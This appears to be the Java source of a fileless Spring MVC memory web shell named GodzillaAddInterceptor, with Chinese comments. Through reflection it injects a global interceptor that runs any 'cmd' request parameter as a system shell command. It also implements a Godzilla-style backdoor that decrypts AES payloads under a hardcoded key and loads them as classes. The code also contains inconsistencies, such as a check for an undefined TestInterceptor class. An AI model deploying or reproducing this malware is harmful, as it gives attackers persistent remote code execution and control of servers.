import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;

public class GodzillaAddInterceptor extends HandlerInterceptorAdapter {

    public GodzillaAddInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException {
        // 获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 从context中获取AbstractHandlerMapping的实例对象
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        // 反射获取adaptedInterceptors属性
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        // 避免重复添加
        for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
            if (adaptedInterceptors.get(i) instanceof TestInterceptor) {
                System.out.println("已经添加过TestInterceptor实例了");
                return;
            }
        }
        GodzillaAddInterceptor aaa = new GodzillaAddInterceptor("aaa");  // 避免进入实例创建的死循环
        adaptedInterceptors.add(aaa);  //  添加全局interceptor
    }

    private GodzillaAddInterceptor(String aaa){}

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        HttpSession session = request.getSession();
        try {
            // cmd exec
            String arg0 = request.getParameter("cmd");
            System.out.println(arg0);
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }

            // Godzilla 逻辑
            System.out.println("GodzillaAddInterceptor Start ......");
            String Pwd = "pass";
            String xc = "3c6e0b8a9c15224a";
            String md5 = md5(Pwd + xc);
            byte[] data = base64Decode(request.getParameter(Pwd));
            data = x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new MyClassLoader(getClass().getClassLoader())).Q(data));
                System.out.println(session.getAttribute("payload"));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class) session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(data);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
                response.getWriter().flush();
                response.getWriter().close();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return true;
    }
    class MyClassLoader extends ClassLoader {
        public MyClassLoader(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[] cb) {
            return defineClass(cb, 0, cb.length);
        }
    }


    public byte[] x(byte[] s, boolean m) {
        String xc = "3c6e0b8a9c15224a";
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception exception) {}
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }
}
